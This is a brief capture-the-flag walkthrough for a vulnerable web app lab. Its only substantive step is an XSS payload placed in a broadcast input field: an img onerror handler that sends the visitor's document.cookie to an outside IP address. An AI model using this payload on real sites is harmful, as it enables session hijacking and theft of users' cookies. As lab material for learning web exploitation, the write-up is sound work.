---
date: 2025-02-20
categories: [CTF, IML]
title: "IML - Mini CTF: Vulnerable Web App – Ep.3"
tags: ['web exploit']

description: "Mini CTF Vulnerable Web App – - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Mini CTF: Vulnerable Web App – Ep.3


![image1](../resources/5b798f6da8f641a3b617ece54837c76f.png)

- Get an input field that broadcasts:


![image2](../resources/da75ca20153e48c98a269378acaa017d.png)

- Use payload:
```bash
<img src=x onerror="location.href='http://10.102.120.158:8001/?c='+ document.cookie">

```

![image3](../resources/14d26214249741618a0004b3d39c7f64.png)